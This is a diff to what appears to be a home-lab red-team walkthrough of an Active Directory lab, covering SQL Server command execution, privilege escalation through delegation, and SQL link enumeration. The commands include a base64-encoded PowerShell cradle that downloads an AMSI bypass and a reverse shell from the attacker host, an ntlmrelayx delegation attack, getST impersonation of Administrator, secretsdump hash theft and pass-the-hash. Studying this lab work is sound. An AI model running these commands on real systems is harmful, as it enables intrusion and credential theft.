@@ -267,7 +267,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 
 **Task: Get a shell.**
 
-1. The first step to execute commands is to check if xp\_cmdshell is enabled, we can do that by just executing xp\_cmdshell and see if it works:
+1. The first step to execute commands is to check if xp\_cmdshell is already enabled, since its only possible to execute cmd commands if that is enabled. We can do that by just executing xp\_cmdshell and see if it works:
 
 ```
 EXEC master..xp_cmdshell 'whoami'
@@ -275,7 +275,7 @@ EXEC master..xp_cmdshell 'whoami'
 
 ![](<../../../.gitbook/assets/image (11) (1).png>)
 
-2\. We receive an error that it is disabled. But we can try to enable it with the following querie:
+2\. We receive an error that it is disabled. But we can try to enable it with the following SQL queries:
 
 ```
 EXEC sp_configure 'show advanced options',1
@@ -286,11 +286,15 @@ RECONFIGURE
 
 ![](<../../../.gitbook/assets/image (10).png>)
 
-Now we can try to execute the whoami command again and it worked:
+Now we can try to execute the `whoami` command again and it worked:
+
+```
+EXEC master..xp_cmdshell 'whoami'
+```
 
 ![](<../../../.gitbook/assets/image (63) (1).png>)
 
-3\. The next step is to gain a shell from WEB01. For this we need to prepare some files and setup a listerener before we execute a querie on the sql server.&#x20;
+3\. The next step is to gain a reverse shell from `WEB01`. For this we need to prepare some files and setup a listener before we execute a query and command on the sql server.&#x20;
 
 * Save the amsi bypass from [here](https://github.com/0xJs/RedTeaming\_CheatSheet/tree/main/windows-ad#amsi-bypass) to a file named `amsi.txt`.
 * Download [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) from Nishang: `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`
@@ -301,15 +305,15 @@ Now we can try to execute the whoami command again and it worked:
 
 ![](<../../../.gitbook/assets/image (35) (1).png>)
 
-4\. Now we need to change/type the payload we want to execute on the sql server. A method I learned to use is base64 encode the command we want to execute and use the -enc parameter inside PowerShell. This prevents a lot of issues with single and double qoutes.
+4\. Now we need to change/type the payload we want to execute on the SQL server. A method I learned to use is to base64 encode the command we want to execute and use the `-enc` parameter inside PowerShell. This prevents a lot of issues with single and double quotes.
 
-* The payload we would like to execute which will download the amsi into memory and then execute the reverse shell after bypassing Windows Defenser amsi:
+* The payload we would like to execute which will download the amsi into memory and then execute the reverse shell after bypassing Windows Defenser amsi is:
 
 ```
 IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));
 ```
 
-* We can save this payload with the following method and base64 encode it:
+* We can save this payload into a variable with the following command and then base64 encode it with the second command:
 
 ```
 $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:8090/Invoke-PowerShellTcp.ps1"));'
@@ -318,7 +322,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 
 ![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
 
-* Now we can paste the base64 encoded string in the following querie:
+* Now we can paste the base64 encoded string in the following SQL query which will execute the base64 encoded PowerShell command:
 
 ```
 EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
@@ -326,7 +330,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
 EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
-5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded and the shell comes in from `WEB01` as `NT service\mssql$dev`:
+5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded from the webserver and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
 ![](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
@@ -334,14 +338,14 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 **Task: Escalate privileges on the machine with a delegation attack.**
 
-One of the privilege escalation techniques that you don't see so much is doing a Resource Based Constrained Delegation attack by relaying the computerhash after forcing a webdav authentication to the attacker machine. To do the attack there are a few requirements which are:
+One of the privilege escalation techniques that you don't see too often is by using a Resource Based Constrained Delegation attack. This attack works by relaying the computerhash to ldap after forcing a webdav authentication to the attacker machine. To do the attack there are a few requirements which are:
 
-* Low privileged shell on a machine
+* A low privileged shell on a machine
 * An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
 * WebDAV redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
 * A DNS record pointing to the attacker’s machine (By default authenticated users can do this).
 
-1. The first requirement we already have, so lets check if the authenticated users can add computers to the domain. We can check this with Crackmapexec:
+1. The first requirement we already have, so lets check if the authenticated users group can add computers to the domain. We can check this with Crackmapexec:
 
 ```
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
@@ -349,7 +353,7 @@ crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 
 ![](<../../../.gitbook/assets/image (71) (1) (1).png>)
 
-2\. The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain. So lets add our own computerobject, this can be done with PowerMad. First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
+2\. The `MachineAccountQouta` is 10, meaning we (all authenticated users) can create our own computerobjects in the domain. So lets add our own computerobject, this can be done with [PowerMad](https://github.com/Kevin-Robertson/Powermad). First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
 ```
 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
@@ -363,7 +367,7 @@ iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 
 ![](<../../../.gitbook/assets/image (24) (1).png>)
 
-Then we can create our own computerobject with the name `FAKE01` and password `123456`.
+Then we can create our own computerobject with the name `FAKE01` and password `123456` using the `New-MachineAccount` cmdlet from PowerMad:
 
 ```
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -379,7 +383,9 @@ Get-WindowsFeature WebDAV-Redirector
 
 ![](<../../../.gitbook/assets/image (14) (1) (1).png>)
 
-4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect to. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP:
+The WebDAV Redirector is installed.
+
+4\. The last requirement is to create a DNS record back to our attacking machine, since the webdav connection won't work without a hostname to connect too. For this we need the [Invoke-DNSUpdate](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1) script from PowerMad. So we download it again and import it in the shell and then run the command to add the dns entry `webdav.amsterdam.bank.local` to our attacking machine IP (`192.168.248.2`):
 
 ```
 #Download on kali
@@ -392,9 +398,9 @@ Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.16
 
 ![](<../../../.gitbook/assets/image (11).png>)
 
-I also did a nslookup to check if the DNS record was created. The domain controller at 10.0.0.3 responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
+I also did a nslookup to check if the DNS record was created. The domain controller at `10.0.0.3` responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
 
-5\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:
+5\. Run [NTLMRelay](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) from impacket on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:
 
 ```
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
@@ -402,7 +408,7 @@ python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-acces
 
 ![](<../../../.gitbook/assets/image (5) (1).png>)
 
-6\. Next we need to download en load the Change-LockScreen.ps1 script from the nccgroup and load it into memory on the target:
+6\. Next we need to download en load the [Change-LockScreen.ps1](https://github.com/nccgroup/Change-Lockscreen) script from the NCCgroup and load it into memory on the target:
 
 ```
 wget https://raw.githubusercontent.com/nccgroup/Change-Lockscreen/masterChange-Lockscreen.ps1
@@ -413,7 +419,7 @@ Now its time to execute the attack. A quick recap from one of our pages:
 
 > Abuse the lockscreen image changing functionality to achieve a webdav network authentication as SYSTEM from the given computer. Then relay the authentication to the Active Directory LDAP service in order to set up Resource-Based Constrained Delegation to that specific machine.
 
-Lets force the webdav request:
+Lets force the webdav request back to our kali attacking machine:
 
 ```
 change-lockscreen -webdav \\webdav@80\
@@ -421,9 +427,9 @@ change-lockscreen -webdav \\webdav@80\
 
 ![](<../../../.gitbook/assets/image (74) (1).png>)
 
-Once we check our ntlmrelay tool output we see that it succesfully authenticated as WEB01$ to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.
+Once we check our NTLMRelay tool output we see that it succesfully authenticated as `WEB01$` to the LDAP port on the DC at `10.0.0.3`. And it says `FAKE01` can now impersonate users on `WEB01`.
 
-7\. The next step is to impersonate a user and request tickets so we can authenticate. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py script. Fill in the password `123456`.
+7\. The next step is to impersonate a user(preferably a domain admin) and request service tickets so we can authenticate to the host. We can create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) script. Fill in the password `123456`.
 
 ```
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
@@ -431,7 +437,7 @@ getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -imperso
 
 ![](<../../../.gitbook/assets/image (33).png>)
 
-8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
+8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) Impacket tools support this. So we can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to retrieve the local useraccount hashes.
 
 ```
 export KRB5CCNAME=administrator.ccache
@@ -440,13 +446,13 @@ secretsdump.py -k -no-pass web01.amsterdam.bank.local
 
 ![](<../../../.gitbook/assets/image (1) (1).png>)
 
-We retrieved the hash of the local administrator user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to WEB01. We can do this with our good old tool crackmapexec.
+We retrieved the hash of the local `administrator` user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to `WEB01`. We can do this with our good old tool `CrackMapExec`.
 
-9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from impacket, well because Defender will block it:
+9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from Impacket, well because Defender will block it:
 
 ![](<../../../.gitbook/assets/image (37).png>)
 
-As said before, we can use the local administrator hash with Crackmapexec and execute commands with the `-x` flag.
+As said before, we can use the local administrator hash with CrackMapExec and execute commands with the `-x` flag.
 
 ```
 crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
@@ -454,7 +460,7 @@ crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -
 
 ![](<../../../.gitbook/assets/image (72) (1).png>)
 
-That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter.
+That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter after starting a listener again to receive the shell:
 
 ```
 nc -lvp 443
@@ -469,11 +475,11 @@ And we received a shell as the local administrator. Gotta love PowerShell :)
 
 **Task: Enumerate SQL Links to hop across trusts.**
 
-1. We now fully own the server web01 which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns these things like:
+1. We now fully own the server `web01` which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use Heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns big tables like this on my fullscreen monitor, its unreadable:
 
 ![](<../../../.gitbook/assets/image (70) (1).png>)
 
-To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with socat. This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.
+To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with [Socat](https://github.com/3ndG4me/socat). This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.
 
 ```
 socat tcp-l:1433,fork tcp:10.0.0.5:1433
@@ -483,13 +489,13 @@ socat tcp-l:1433,fork tcp:10.0.0.5:1433
 You can also do this to connect with the native windows Remote Desktop client instead of rdesktop or any linux remote desktop tool. I really prefer doing it that way.
 {% endhint %}
 
-On our Windows 10 machine we need to start [HeidiSQL](https://www.heidisql.com/) with a runas command to authenticate with windows credentials:
+On our Windows 10 machine we need to start [HeidiSQL](https://www.heidisql.com/) with a runas command to be able to authenticate with the domain user `Richard` his credentials. When prompted for the password enter `Sample123`.
 
 ```
 runas /netonly /user:amsterdam\richard c:\Tools\AD\HeidiSQL_11.3_64_Portable\heidisql.exe
 ```
 
-Then we can connect to the database using the following setup:
+Then we can connect to the database using the following settings:
 
 ![](<../../../.gitbook/assets/image (68).png>)
 
@@ -497,7 +503,7 @@ Then we can connect to the database using the following setup:
 For this to work you will need to fill in the IP of your kali machine, which need to be in the same network as the Windows 10 machine.
 {% endhint %}
 
-2\. In HeidiSQL click on the Query tab and execute the following query to enumerate SQL links:
+2\. In HeidiSQL click on the "Query" tab and execute the following query to enumerate SQL links:
 
 ```
 SELECT * FROM master..sysservers;
@@ -505,7 +511,7 @@ SELECT * FROM master..sysservers;
 
 ![](<../../../.gitbook/assets/image (71) (1).png>)
 
-3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server with the following query, using the openquery functionality:
+3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server for the SQL server version with the following query, using the openquery functionality:
 
 ```
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
@@ -521,7 +527,11 @@ SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations
 
 ![](<../../../.gitbook/assets/image (56).png>)
 
-Unfortunatelly it isn't enabled. We could try to enable it (and that works too if you configured it). But that is'n't the intended way for the attack path.
+Unfortunately it isn't enabled.&#x20;
+
+{% hint style="success" %}
+You could try to enable it (and that works too if you configured it in one of the pages). But that isn't the intended way for the attack path and gain access to the machine. Feel free to test it though.
+{% endhint %}
 
 ### 8. UNC Path injection
 
